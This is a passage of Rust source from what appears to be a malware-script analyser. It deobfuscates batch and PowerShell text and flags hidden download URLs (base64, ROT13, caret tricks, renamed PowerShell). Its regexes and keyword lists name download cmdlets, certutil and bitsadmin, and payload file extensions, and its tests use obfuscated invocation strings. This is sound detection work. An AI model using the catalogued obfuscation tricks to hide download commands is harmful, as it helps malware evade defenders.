        scan_wget_deob_text(deobfuscated, env);
    });
    scan_step!("certutil_urlcache_deob_text", {
        scan_certutil_urlcache_deob_text(deobfuscated, env);
    });
    scan_step!("damaged_scheme_download_urls", {
        scan_damaged_scheme_download_urls(deobfuscated, env);
    });
    scan_step!("ps_replace_chain_urls", {
        scan_ps_replace_chain_urls(deobfuscated, env);
    });
    scan_step!("ps_bare_url_downloads", {
        scan_ps_bare_url_downloads(deobfuscated, env);
    });
    scan_step!("js_fromcharcode_urls", {
        scan_js_fromcharcode_urls(deobfuscated, env);
    });
    scan_step!("js_unescape_urls", {
        scan_js_unescape_urls(deobfuscated, env);
    });
    scan_step!("extrac32_self_extract", {
        scan_extrac32_self_extract(deobfuscated, env);
    });
    scan_step!("ps_var_socket_connect", {
        scan_ps_var_socket_connect(deobfuscated, env);
    });
    scan_step!("resolved_deob_var_fragment_urls", {
        scan_resolved_deob_var_fragment_urls(deobfuscated, env);
    });
    scan_step!("embedded_powershell_download_deob_text", {
        scan_embedded_powershell_downloads_in_deob_text(deobfuscated, env);
    });
    scan_step!("glued_rundll32_deob_text", {
        scan_glued_rundll32_deob_text(deobfuscated, env);
    });
    scan_step!("mshta_local_deob_text", {
        scan_mshta_local_deob_text(deobfuscated, env);
    });

    scan_step!("url_sweep", {
        // Build a set of URLs already known
        let known = env.known_extracted_urls();

        // Sweep
        let mut seen_new: std::collections::HashSet<String> = std::collections::HashSet::new();
        for caps in URL_RE.captures_iter(deobfuscated) {
            let Some(m) = caps.get(1) else { continue };
            let mut url = trim_liberal_url_suffix(m.as_str()).to_string();
            if url.len() < 8 {
                continue;
            } // http://x is the minimum sensible URL
            if let Some(normalized) = normalize_liberal_url_token(&url) {
                url = normalized;
            }
            if is_noise_url(&url) {
                continue;
            }
            if is_known_or_known_query_prefix(&known, &url) {
                continue;
            }
            if !seen_new.insert(url.clone()) {
                continue;
            }

            // Best-effort: find the line containing this URL for context
            let line_hint = deobfuscated
                .lines()
                .find(|l| l.contains(&url))
                .map(|l| l.chars().take(200).collect::<String>())
                .unwrap_or_default();
            if is_noise_url_context(&line_hint, &url) {
                continue;
            }

            env.traits.push(Trait::DownloadInDeobText {
                src: url,
                line_hint,
            });
        }
    });
}

/// Scan the small synthetic text assembled from recovered binary artifact
/// strings. The collector only admits behavior hints for these detector
/// families, so running the full deobfuscated-text scanner stack here is
/// unnecessary work and can introduce unrelated matches if future hints are
/// added too broadly.
pub fn scan_recovered_artifact_behavior_text(text: &str, env: &mut Environment) {
    scan_defender_evasion(text, env);
    scan_inmem_assembly_load(text, env);
    scan_anti_recovery(text, env);
}

fn scan_resolved_deob_var_fragment_urls(deobfuscated: &str, env: &mut Environment) {
    if !has_resolved_deob_var_fragment_shape(deobfuscated) {
        return;
    }

    let mut known = env.known_extracted_urls();
    let mut scratch = env.clone();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let mut candidates = 0usize;
    for line in deobfuscated.lines() {
        crate::handlers::set::h_set(line, &mut scratch);
        if candidates >= 32 {
            break;
        }
        if line.len() > 16 * 1024 {
            continue;
        }
        if !line.contains('%') || !line.contains("://") || !line.contains(":~") {
            continue;
        }
        candidates += 1;
        let mut expanded_inputs = Vec::new();
        let expanded = crate::normalize::normalize_to_string(&crate::lex::lex(line), &mut scratch);
        if expanded != line && expanded.contains("://") {
            expanded_inputs.push(expanded);
        }
        collect_resolved_quoted_var_fragment_inputs(line, &mut scratch, &mut expanded_inputs);
        collect_resolved_var_fragment_url_inputs(line, &mut scratch, &mut expanded_inputs);

        for expanded in expanded_inputs {
            if has_powershell_download_atom(&expanded) {
                let before_len = env.traits.len();
                if has_embedded_powershell_invocation_atom(&expanded) {
                    scan_embedded_powershell_downloads_in_deob_text(&expanded, env);
                } else {
                    scan_powershell_download_body_in_deob_text(&expanded, env);
                }
                remember_trait_urls(&mut known, &env.traits[before_len..]);
            }
            for caps in URL_RE.captures_iter(&expanded) {
                let Some(m) = caps.get(1) else { continue };
                let mut url = trim_liberal_url_suffix(m.as_str()).to_string();
                if url.len() < 8 {
                    continue;
                }
                if let Some(normalized) = normalize_liberal_url_token(&url) {
                    url = normalized;
                }
                if is_noise_url(&url)
                    || is_known_or_known_query_prefix(&known, &url)
                    || !seen.insert(url.clone())
                {
                    continue;
                }
                env.traits.push(Trait::DownloadInDeobText {
                    src: url,
                    line_hint: "resolved-deob-var-fragments".to_string(),
                });
            }
        }
    }
}

pub(crate) fn has_resolved_deob_var_fragment_shape(deobfuscated: &str) -> bool {
    if !deobfuscated.contains('%') || !deobfuscated.contains("://") || !deobfuscated.contains(":~")
    {
        return false;
    }

    deobfuscated.lines().any(|line| {
        line.len() <= 16 * 1024 && line.contains('%') && line.contains("://") && line.contains(":~")
    })
}

fn collect_resolved_quoted_var_fragment_inputs(
    line: &str,
    env: &mut Environment,
    out: &mut Vec<String>,
) {
    let mut quote_start: Option<(usize, char)> = None;
    for (idx, ch) in line.char_indices() {
        match quote_start {
            Some((start, quote)) if ch == quote => {
                let segment = &line[start + quote.len_utf8()..idx];
                if segment.len() <= 8192
                    && segment.contains('%')
                    && segment.contains("://")
                    && segment.contains(":~")
                {
                    let expanded =
                        crate::normalize::normalize_to_string(&crate::lex::lex(segment), env);
                    if expanded != segment && expanded.contains("://") {
                        out.push(expanded);
                    }
                }
                quote_start = None;
            }
            None if ch == '\'' || ch == '"' => {
                quote_start = Some((idx, ch));
            }
            _ => {}
        }
    }
}

fn collect_resolved_var_fragment_url_inputs(
    line: &str,
    env: &mut Environment,
    out: &mut Vec<String>,
) {
    let mut search_start = 0usize;
    while let Some(rel_marker) = line[search_start..].find("://") {
        let marker = search_start + rel_marker;
        let start = line[..marker]
            .char_indices()
            .rev()
            .find_map(|(idx, ch)| {
                if is_var_fragment_url_boundary(ch) {
                    Some(idx + ch.len_utf8())
                } else {
                    None
                }
            })
            .unwrap_or(0);
        let after_marker = marker + "://".len();
        let end = line[after_marker..]
            .char_indices()
            .find_map(|(rel_idx, ch)| {
                if is_var_fragment_url_boundary(ch) {
                    Some(after_marker + rel_idx)
                } else {
                    None
                }
            })
            .unwrap_or(line.len());
        let segment = &line[start..end];
        if segment.len() <= 8192
            && segment.contains('%')
            && segment.contains("://")
            && segment.contains(":~")
        {
            let expanded = crate::normalize::normalize_to_string(&crate::lex::lex(segment), env);
            if expanded != segment && expanded.contains("://") {
                out.push(expanded);
            }
        }
        search_start = after_marker;
    }
}

fn is_var_fragment_url_boundary(ch: char) -> bool {
    ch.is_whitespace() || matches!(ch, '"' | '\'' | '(' | ')' | '[' | ']' | '{' | '}' | ';')
}

pub fn scan_raw_marker_powershell_urls(input: &[u8], env: &mut Environment) {
    if !input.windows(2).any(|window| window == b"%!") {
        return;
    }
    let text = String::from_utf8_lossy(input);
    let mut normalized = text.replace('^', "");
    normalized = normalized
        .replace("%!A%", "E")
        .replace("%!a%", "e")
        .replace("%A%", "E")
        .replace("%a%", "e");
    let lower = normalized.to_ascii_lowercase();
    if !lower.contains("powershell")
        || !(lower.contains("download")
            || lower.contains("adstring")
            || lower.contains("webclient"))
    {
        return;
    }

    let ps_payload = normalized
        .lines()
        .filter(|line| {
            let line_lower = line.to_ascii_lowercase();
            line_lower.contains("powershell")
                || line_lower.contains("download")
                || line_lower.contains("adstring")
        })
        .collect::<Vec<_>>()
        .join("\n");
    if !ps_payload.is_empty() {
        let normalized_payload = ps_payload.as_bytes().to_vec();
        let mut payload_env = env.clone();
        let traits_before = payload_env.traits.len();
        payload_env.all_extracted_ps1 = vec![normalized_payload];
        crate::ps1_scan::scan_ps1_payloads(&mut payload_env);
        env.traits
            .extend(payload_env.traits.into_iter().skip(traits_before));
    }

    let known = env.known_extracted_urls();
    let mut seen = std::collections::HashSet::new();
    for line in normalized.lines() {
        let line_lower = line.to_ascii_lowercase();
        if !line_lower.contains("powershell")
            && !line_lower.contains("download")
            && !line_lower.contains("adstring")
        {
            continue;
        }
        for caps in URL_RE.captures_iter(line) {
            let Some(m) = caps.get(1) else { continue };
            let url = trim_liberal_url_suffix(m.as_str()).to_string();
            if url.len() < 10 || url.len() > 2048 {
                continue;
            }
            if is_noise_url(&url) || known.contains(&url) || !seen.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::DownloadInDeobText {
                src: url,
                line_hint: "raw-marker-powershell".to_string(),
            });
        }
    }
}

pub fn scan_embedded_powershell_invocations(text: &str, env: &mut Environment) {
    if !has_embedded_powershell_invocation_atom(text) {
        return;
    }
    let normalized = text.replace('^', "");
    for line in normalized.lines() {
        for m in EMBEDDED_POWERSHELL_RE.find_iter(line) {
            let tail = &line[m.start()..];
            if !looks_like_embedded_powershell_payload(tail) {
                continue;
            }
            crate::handlers::powershell::h_powershell(tail, env);
        }
    }
    dedup_exec_ps1(env);
}

fn has_embedded_powershell_invocation_atom(text: &str) -> bool {
    contains_ascii_case_insensitive_command_atom_with_optional_carets(
        text.as_bytes(),
        b"powershell",
    ) || contains_ascii_case_insensitive_command_atom_with_optional_carets(text.as_bytes(), b"pwsh")
}

fn contains_ascii_case_insensitive_command_atom_with_optional_carets(
    haystack: &[u8],
    needle: &[u8],
) -> bool {
    if needle.is_empty() {
        return true;
    }

    for (start, &b) in haystack.iter().enumerate() {
        if !is_ascii_command_atom_start_boundary(haystack, start) {
            continue;
        }
        if !b.eq_ignore_ascii_case(&needle[0]) {
            continue;
        }

        let mut hay_idx = start + 1;
        let mut needle_idx = 1;
        while needle_idx < needle.len() && hay_idx < haystack.len() {
            let current = haystack[hay_idx];
            if current == b'^' {
                hay_idx += 1;
                continue;
            }
            if !current.eq_ignore_ascii_case(&needle[needle_idx]) {
                break;
            }
            hay_idx += 1;
            needle_idx += 1;
        }
        if needle_idx == needle.len() && is_ascii_command_atom_end_boundary(haystack, hay_idx) {
            return true;
        }
    }

    false
}

fn is_ascii_command_atom_start_boundary(haystack: &[u8], start: usize) -> bool {
    start == 0
        || haystack
            .get(start - 1)
            .map_or(true, |b| !b.is_ascii_alphanumeric() && *b != b'_')
}

fn is_ascii_command_atom_end_boundary(haystack: &[u8], mut end: usize) -> bool {
    if haystack.get(end) == Some(&b'.')
        && haystack
            .get(end + 1..end + 4)
            .is_some_and(|suffix| suffix.eq_ignore_ascii_case(b"exe"))
    {
        end += 4;
    }
    let boundary = haystack
        .get(end)
        .map_or(true, |b| !b.is_ascii_alphanumeric() && *b != b'_');
    // Avoid treating `powershell.dll` / `powershellconsole` style paths
    // as invocations; `.exe` is the only dotted command suffix accepted.
    boundary && haystack.get(end) != Some(&b'.')
}

#[cfg(test)]
mod embedded_powershell_invocation_gate_tests {
    use super::has_embedded_powershell_invocation_atom;

    #[test]
    fn allows_plain_powershell_and_pwsh_atoms() {
        assert!(has_embedded_powershell_invocation_atom(
            "powershell -enc AAAA"
        ));
        assert!(has_embedded_powershell_invocation_atom(
            "powershell.exe -enc AAAA"
        ));
        assert!(has_embedded_powershell_invocation_atom("PwSh -c iwr"));
        assert!(has_embedded_powershell_invocation_atom("PwSh.exe -c iwr"));
    }

    #[test]
    fn allows_caret_obfuscated_powershell_atom() {
        assert!(has_embedded_powershell_invocation_atom(
            "p^o^w^e^r^s^h^e^l^l -enc AAAA"
        ));
    }

    #[test]
    fn blocks_pwsh_inside_encoded_token() {
        assert!(!has_embedded_powershell_invocation_atom(
            "set X=abcPWSHdef123"
        ));
    }

    #[test]
    fn blocks_powershell_inside_path_component() {
        assert!(!has_embedded_powershell_invocation_atom(
            r"copy C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1 out.txt"
        ));
    }

    #[test]
    fn blocks_unrelated_caret_heavy_text() {
        assert!(!has_embedded_powershell_invocation_atom(
            "^p ^o ^w ^not ^a ^shell command"
        ));
    }
}

pub fn scan_renamed_powershell_invocations(text: &str, env: &mut Environment) {
    let mut aliases: std::collections::HashSet<String> = std::collections::HashSet::new();

    for t in &env.traits {
        let Trait::WindowsUtilManip { src, dst, .. } = t else {
            continue;
        };
        let src_base = command_basename(src);
        if !matches!(
            src_base.as_str(),
            "powershell.exe" | "powershell" | "pwsh.exe" | "pwsh"
        ) {
            continue;
        }
        aliases.insert(command_basename(dst));
        aliases.insert(dst.trim_matches('"').to_ascii_lowercase());
    }

    for line in text.lines() {
        let words = split_words(line);
        if words.len() < 3 {
            continue;
        }
        let command = command_basename(&words[0]);
        if command != "copy" && command != "xcopy" {
            continue;
        }

        let mut saw_powershell_source = false;
        for word in words.iter().skip(1) {
            let lower = word.to_ascii_lowercase();
            if lower.starts_with('/') || lower.starts_with('-') {
                continue;
            }
            if matches!(
                command_basename(word).as_str(),
                "powershell.exe" | "powershell" | "pwsh.exe" | "pwsh"
            ) {
                saw_powershell_source = true;
                continue;
            }
            if saw_powershell_source {
                aliases.insert(command_basename(word));
                break;
            }
        }
    }

    if aliases.is_empty() {
        return;
    }

    for line in text.lines() {
        let words = split_words(line);
        let Some(command) = words.first() else {
            continue;
        };
        if !aliases.contains(&command_basename(command)) {
            continue;
        }
        if !looks_like_embedded_powershell_payload(line) {
            continue;
        }
        push_manipulated_exec_once(env, line, command);
        let rest = line
            .get(command.len()..)
            .map(str::trim_start)
            .unwrap_or_default();
        let replay = if rest.is_empty() {
            "powershell.exe".to_string()
        } else {
            format!("powershell.exe {rest}")
        };
        crate::handlers::powershell::h_powershell(&replay, env);
    }
    dedup_exec_ps1(env);
}

fn push_manipulated_exec_once(env: &mut Environment, cmd: &str, target: &str) {
    let target = target.trim_matches(['"', '\'']).to_string();
    if !env.traits.iter().any(|t| {
        matches!(
            t,
            Trait::ManipulatedExec {
                cmd: existing_cmd,
                target: existing_target
            } if existing_cmd == cmd && existing_target == &target
        )
    }) {
        env.traits.push(Trait::ManipulatedExec {
            cmd: cmd.to_string(),
            target,
        });
    }
}

fn scan_embedded_powershell_downloads_in_deob_text(text: &str, env: &mut Environment) {
    if !has_embedded_powershell_invocation_atom(text) {
        return;
    }
    let normalized = text.replace('^', "");
    let mut payload_env = Environment::new(&Config {
        max_depth: env.limits.max_depth,
        max_iterations: env.limits.max_iterations,
        max_child_scripts: env.limits.max_child_scripts,
        timeout_secs: 0,
        self_extract: false,
        winver: env.winver,
        max_output_bytes: env.limits.max_output_bytes,
        max_output_line_bytes: env.limits.max_output_line_bytes,
        max_traits_per_kind: 100,
    });
    payload_env.ps1_scan_cache_normalized = false;

    for line in normalized.lines() {
        for m in EMBEDDED_POWERSHELL_RE.find_iter(line) {
            let tail = &line[m.start()..];
            if !has_powershell_download_atom(tail) {
                continue;
            }
            crate::handlers::powershell::h_powershell(tail, &mut payload_env);
        }
    }
    if payload_env.exec_ps1.is_empty() {
        return;
    }

    payload_env
        .all_extracted_ps1
        .extend(std::mem::take(&mut payload_env.exec_ps1));
    crate::ps1_scan::scan_ps1_payloads(&mut payload_env);

    let mut known = env.known_extracted_urls();
    append_new_url_traits(env, &mut known, payload_env.traits);
}

fn scan_powershell_download_body_in_deob_text(text: &str, env: &mut Environment) {
    if !has_powershell_download_atom(text) {
        return;
    }
    let mut payload_env = Environment::new(&Config {
        max_depth: env.limits.max_depth,
        max_iterations: env.limits.max_iterations,
        max_child_scripts: env.limits.max_child_scripts,
        timeout_secs: 0,
        self_extract: false,
        winver: env.winver,
        max_output_bytes: env.limits.max_output_bytes,
        max_output_line_bytes: env.limits.max_output_line_bytes,
        max_traits_per_kind: 100,
    });
    payload_env.ps1_scan_cache_normalized = false;
    payload_env.all_extracted_ps1.push(text.as_bytes().to_vec());
    crate::ps1_scan::scan_ps1_payloads(&mut payload_env);

    let mut known = env.known_extracted_urls();
    append_new_url_traits(env, &mut known, payload_env.traits);
}

fn append_new_url_traits(
    env: &mut Environment,
    known: &mut HashSet<String>,
    traits: impl IntoIterator<Item = Trait>,
) {
    for trait_ in traits {
        if let Some(url) = trait_url(&trait_) {
            if !known.insert(url.to_string()) {
                continue;
            }
        }
        env.traits.push(trait_);
    }
}

fn remember_trait_urls(known: &mut HashSet<String>, traits: &[Trait]) {
    for trait_ in traits {
        if let Some(url) = trait_url(trait_) {
            known.insert(url.to_string());
        }
    }
}

fn has_powershell_download_atom(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    PS_DOWNLOAD_VERB_RE.is_match(&lower)
        || lower.contains("invoke-webrequest")
        || lower.contains("invoke-restmethod")
        || lower.contains("downloadstring")
        || lower.contains("downloadfile")
        || lower.contains("downloaddata")
        || lower.contains("start-bitstransfer")
        || lower.contains("new-object net.webclient")
}

fn trait_url(t: &Trait) -> Option<&str> {
    match t {
        Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. } => Some(src),
        Trait::CertutilDownload { url, .. }
        | Trait::BitsadminDownload { url, .. }
        | Trait::UrlLaunch { url, .. }
        | Trait::UrlArgument { url, .. }
        | Trait::UrlVariable { url, .. }
        | Trait::RegistryUrl { url, .. } => Some(url),
        Trait::Rundll32 { url: Some(url), .. } => Some(url),
        Trait::UncWebDavC2 { http_url, .. } if !http_url.is_empty() => Some(http_url),
        _ => None,
    }
}

fn command_basename(word: &str) -> String {
    word.trim_matches('"')
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(word)
        .to_ascii_lowercase()
}

fn looks_like_embedded_powershell_payload(tail: &str) -> bool {
    let lower = tail.to_ascii_lowercase();
    // Structural signal — a flag shorthand or download-verb at command
    // position. Substring `contains("downloadstring")` style checks miss
    // any sample that splits the keyword via backtick or variable
    // indirection (`Down`+`loadString`, `Invoke-Web``Request`, etc.).
    if PS_SHORTHAND_GATE_RE.is_match(&lower) {
        return true;
    }
    if PS_DOWNLOAD_VERB_RE.is_match(&lower) {
        return true;
    }
    // Permissive fallbacks for cases where the gate above misses but the
    // tail still clearly contains a payload signal.
    lower.contains("frombase64string") || lower.contains("http://") || lower.contains("https://")
}

/// Matches PS download-verb tokens (alias or full cmdlet) at command
/// position. Mirrors what canonical_ps_flag would resolve at the handler
/// level but at the gate level — once we see this we know the line is a
/// payload candidate worth handing to h_powershell.
#[allow(clippy::expect_used)]
static PS_DOWNLOAD_VERB_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)(?:^|[\s;|&(])(?:invoke-webrequest|invoke-restmethod|iwr|irm|wget|curl|downloadstring|downloadfile|downloaddata|start-bitstransfer|new-object\s+net\.webclient)\b",
    )
    .expect("ps download verb regex")
});

/// Matches any powershell.exe shorthand for `-Command` or `-EncodedCommand`,
/// in either dash or forward-slash form. Mirrors the shorthand resolution in
/// `handlers/powershell.rs::canonical_ps_flag` at the gate level: prefix
/// abbreviations (`-Enc`, `-Encoded`, `-Co`) plus the CamelCase initials
/// (`-Ec`) that PS accepts as unambiguous parameter binding.
#[allow(clippy::expect_used)]
static PS_SHORTHAND_GATE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)(?:^|[\s;|&])[-/](?:e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand|c|co|com|comm|comma|comman|command|f|fi|fil|file)\b",
    )
    .expect("ps shorthand gate")
});

fn dedup_exec_ps1(env: &mut Environment) {
    let mut seen: std::collections::HashSet<Vec<u8>> = std::collections::HashSet::new();
    env.exec_ps1.retain(|payload| seen.insert(payload.clone()));
}

/// Match any run of base64 chars whose prefix decodes to "http" (`aHR0c`),
/// "https" (`aHR0cHM`), or "ftp" (`ZnRwOi8v`). The prefix anchor stops the
/// regex from firing on random b64 noise; the {16,500} suffix keeps the
/// runtime cost bounded.
#[allow(clippy::expect_used)]
static B64_URL_PREFIX_RE: Lazy<Regex> = Lazy::new(|| {
    // UTF-8 ASCII variant: http(s)/ftp directly base64-encoded.
    //   `aHR0cDov…` (http://…)
    //   `aHR0cHM6Ly…` (https://…)
    //   `ZnRwOi8v…` (ftp://…)
    // UTF-16LE variant (common in PowerShell `[Convert]::ToBase64String(
    //   [Text.Encoding]::Unicode.GetBytes(...))`):
    //   `aAB0AHQAcAA…` (UTF-16LE "http")
    //   `aAB0AHQAcABzA…` (UTF-16LE "https")
    //   `ZgB0AHAA…` (UTF-16LE "ftp")
    Regex::new(r"(aHR0[cd][DH]|ZnRwOi8v|aAB0AHQAcAA|aAB0AHQAcABzA|ZgB0AHAA)[A-Za-z0-9+/=]{16,500}")
        .expect("b64 url prefix regex")
});

#[allow(clippy::expect_used)]
static ROT13_URL_PREFIX_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\b(?:uggcf|uggc|sgc):[\x2f\x5c]+[^\s"'<>(){}|^&;`,]{6,500}"#)
        .expect("rot13 url prefix regex")
});

#[allow(clippy::expect_used)]
static DAMAGED_SCHEME_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|[^A-Za-z])([A-Za-z0-9_%!$:~,\-]{0,80})://([A-Za-z0-9][A-Za-z0-9.\-]{2,}\.[A-Za-z]{2,}(?::\d+)?(?:/[^\s"'<>)]*)?)"#,
    )
    .expect("damaged scheme URL regex")
});

pub fn scan_damaged_scheme_download_urls(deobfuscated: &str, env: &mut Environment) {
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for line in deobfuscated.lines() {
        for caps in DAMAGED_SCHEME_URL_RE.captures_iter(line) {
            let Some(prefix) = caps.get(1) else { continue };
            let prefix_lower = prefix.as_str().to_ascii_lowercase();
            if matches!(prefix_lower.as_str(), "http" | "https" | "ftp") {
                continue;
            }
            let Some(host_path) = caps.get(2) else {
                continue;
            };
            if !is_download_context_line(line)
                && !is_high_confidence_damaged_download_url(
                    prefix.as_str(),
                    host_path.as_str(),
                    line,
                )
            {
                continue;
            }
            let mut url = format!("https://{}", host_path.as_str());
            url = trim_liberal_url_suffix(&url).to_string();
            if url.len() < 10 || url.len() > 2048 {
                continue;
            }
            if is_noise_url(&url) || known.contains(&url) || !seen.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::DownloadInDeobText {
                src: url,
                line_hint: "damaged-scheme-download-context".to_string(),
            });
        }
    }
}

fn is_high_confidence_damaged_download_url(prefix: &str, host_path: &str, line: &str) -> bool {
    let prefix_lower = prefix.to_ascii_lowercase();
    let host_path_lower = host_path.to_ascii_lowercase();
    let line_lower = line.to_ascii_lowercase();
    let has_cmd_substring_artifact = prefix_lower.contains(":~")
        || prefix_lower.contains('%')
        || prefix_lower.contains('!')
        || line_lower.contains(":~");
    if !has_cmd_substring_artifact {
        return false;
    }

    if host_path_lower.starts_with("gitlab.com/") && host_path_lower.contains("/-/raw/") {
        return true;
    }
    if host_path_lower.starts_with("raw.githubusercontent.com/") {
        return true;
    }
    if host_path_lower.starts_with("github.com/") && host_path_lower.contains("/raw/") {
        return true;
    }
    if host_path_lower.starts_with("www.dropbox.com/")
        || host_path_lower.starts_with("dropbox.com/")
        || host_path_lower.starts_with("dl.dropboxusercontent.com/")
    {
        return true;
    }

    line_lower.contains("url")
        && host_path_lower
            .split(['?', '#'])
            .next()
            .is_some_and(has_payload_file_extension)
}

fn has_payload_file_extension(path: &str) -> bool {
    const PAYLOAD_EXTENSIONS: &[&str] = &[
        ".7z", ".apk", ".appx", ".au3", ".bat", ".cab", ".chm", ".cmd", ".com", ".cpl", ".dll",
        ".doc", ".docm", ".docx", ".drv", ".elf", ".exe", ".hta", ".img", ".inf", ".iso", ".jar",
        ".js", ".jse", ".lnk", ".msi", ".msp", ".msix", ".msc", ".ocx", ".one", ".pdf", ".pl",
        ".ps1", ".psm1", ".ppt", ".pptm", ".pptx", ".py", ".pyw", ".rar", ".reg", ".rtf", ".sct",
        ".scr", ".sh", ".so", ".sys", ".url", ".vbs", ".vhd", ".vhdx", ".wsf", ".wsh", ".xlam",
        ".xls", ".xlsm", ".xlsx", ".xll", ".zip",
    ];
    PAYLOAD_EXTENSIONS.iter().any(|ext| path.ends_with(ext))
}

fn is_download_context_line(line: &str) -> bool {
    let lower = line.to_ascii_lowercase();
    lower.contains("downloadfile")
        || lower.contains("downloadstring")
        || lower.contains("downloaddata")
        || lower.contains("invoke-webrequest")
        || lower.contains("invoke-restmethod")
        || lower.contains("new-object net.webclient")
        || lower.contains("bitsadmin")
        || lower.contains("urlcache")
        || lower.contains("verifyctl")
        || lower.contains("curl ")
        || lower.contains("curl.exe")
        || lower.contains("wget ")
        || lower.contains("iwr ")
        || lower.contains("irm ")
        || (lower.contains("://")
            && (lower.contains("', '")
                || lower.contains("\", \"")
                || lower.contains("', \"")
                || lower.contains("\", '")))
}

/// Scan for free-floating `aHR0c…` (base64 `http`) tokens that the
/// existing inline/quoted scanners miss because the b64 isn't passed
/// directly to `FromBase64String` or wrapped in its own quotes — e.g.
/// `set "encoded_url=aHR0c…"` (b64 is part of the quoted value, not the
/// whole value) or `$x = "prefix"+"aHR0c…"+"suffix"`.
pub fn scan_b64_url_prefix(deobfuscated: &str, env: &mut Environment) {
    use base64::Engine;
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for m in B64_URL_PREFIX_RE.find_iter(deobfuscated) {
        if m.start() > 0 && is_base64_byte(deobfuscated.as_bytes()[m.start() - 1]) {
            continue;
        }
        if m.end() < deobfuscated.len() && is_base64_byte(deobfuscated.as_bytes()[m.end()]) {
            continue;
        }
        let mut b64 = m.as_str().to_string();
        // Trim to a 4-multiple length for stricter decoder (we don't pad
        // since stray garbage after the b64 would otherwise still decode
        // and yield junk after the URL).
        while b64.len() % 4 != 0 {
            b64.pop();
        }
        if b64.len() < 16 {
            continue;
        }
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(&b64) else {
            continue;
        };
        // UTF-16LE bytes look like ASCII chars interleaved with NULs
        // (`h\x00t\x00t\x00…`). Strip those NULs before character-class
        // filtering so UTF-16LE-encoded URLs render correctly.
        let normalized: Vec<u8> = if decoded.len() >= 4 && decoded[1] == 0 && decoded[3] == 0 {
            decoded.iter().step_by(2).copied().collect()
        } else {
            decoded.clone()
        };
        // The decoded text usually has a clean URL up to the first
        // control byte / whitespace / quote; trim there. We treat
        // SPACE, TAB, NUL, `"`, `'`, `<`, `>` as URL terminators so a
        // longer payload doesn't carry trailing arguments into the
        // extracted src field (which then misses our `known` dedup).
        let mut text = String::new();
        for &b in normalized.iter() {
            if !(0x21..=0x7e).contains(&b) {
                break;
            }
            if matches!(b, b'"' | b'\'' | b'<' | b'>') {
                break;
            }
            text.push(b as char);
        }
        if !(text.starts_with("http://")
            || text.starts_with("https://")
            || text.starts_with("ftp://"))
        {
            continue;
        }
        // Trim trailing punctuation that's clearly not part of the URL.
        while let Some(c) = text.chars().last() {
            if matches!(
                c,
                '.' | ',' | ';' | ':' | ')' | ']' | '}' | '"' | '\'' | '!' | '?'
            ) {
                text.pop();
            } else {
                break;
            }
        }
        if text.len() < 10 || text.len() > 2048 {
            continue;
        }
        if is_noise_url(&text) {
            continue;
        }
        if known.contains(&text) {
            continue;
        }
        if !seen.insert(text.clone()) {
            continue;
        }
        env.traits.push(Trait::Download {
            cmd: "b64-url-prefix".to_string(),
            src: text,
            dst: None,
        });
    }
}

fn is_base64_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/')
}

/// Scan for ROT13-obfuscated URL tokens such as `uggcf://...`. These show
/// up in staged PowerShell/.NET argument lists where we do not want to
/// reverse the managed payload, but the network indicators are still present
/// as simple encoded strings.
pub fn scan_rot13_url_prefix(deobfuscated: &str, env: &mut Environment) {
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for m in ROT13_URL_PREFIX_RE.find_iter(deobfuscated) {
        let mut text = rot13_ascii(m.as_str());
        if !(text.starts_with("http://")
            || text.starts_with("https://")
            || text.starts_with("ftp://"))
        {
            continue;
        }
        text = trim_liberal_url_suffix(&text).to_string();
        if let Some(normalized) = normalize_liberal_url_token(&text) {
            text = normalized;
        }
        if text.len() < 10 || text.len() > 2048 {
            continue;
        }
        if is_noise_url(&text) || known.contains(&text) || !seen.insert(text.clone()) {
            continue;
        }
        env.traits.push(Trait::Download {
            cmd: "rot13-url-prefix".to_string(),
            src: text,
            dst: None,
        });
    }
}

fn rot13_ascii(input: &str) -> String {
    input
        .bytes()
        .map(|b| match b {
            b'a'..=b'z' => (((b - b'a' + 13) % 26) + b'a') as char,
            b'A'..=b'Z' => (((b - b'A' + 13) % 26) + b'A') as char,
            _ => b as char,
        })
        .collect()
}

/// Match a single PowerShell `[char[]]@(N,N,...)-join''` chunk.
#[allow(clippy::expect_used)]
static PS_CHAR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"\(\[(?:char\[\]|\[\])\]@\(([\d,\s]+)\)\s*-join\s*'{1,2}\)")
        .expect("ps char concat regex")
});

/// Scan PowerShell `[char[]]@(N,N,...)-join''` chains: concatenate
/// adjacent decoded chunks and look for resulting URLs. Many samples
/// hide their C2 URL across 10-20 small char-array chunks joined by
/// PowerShell `+` operators; the existing URL scanners can't see
/// through the unconcatenated source.
pub fn scan_ps_char_concat_urls(deobfuscated: &str, env: &mut Environment) {
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    // Walk the text; whenever we see a chunk, decode it and append it
    // to a buffer if it's separated from the previous chunk only by
    // whitespace and `+` operators. On break-of-chain (non-trivial
    // text between), flush the buffer and check for a URL.
    let mut buf = String::new();
    let mut prev_end = 0usize;
    for m in PS_CHAR_CONCAT_RE.captures_iter(deobfuscated) {
        let Some(outer) = m.get(0) else { continue };
        let Some(nums) = m.get(1) else { continue };
        // If the gap between prev_end and this match is just `+` / spaces,
        // continue the chain. Otherwise flush + reset.
        let gap = &deobfuscated[prev_end..outer.start()];
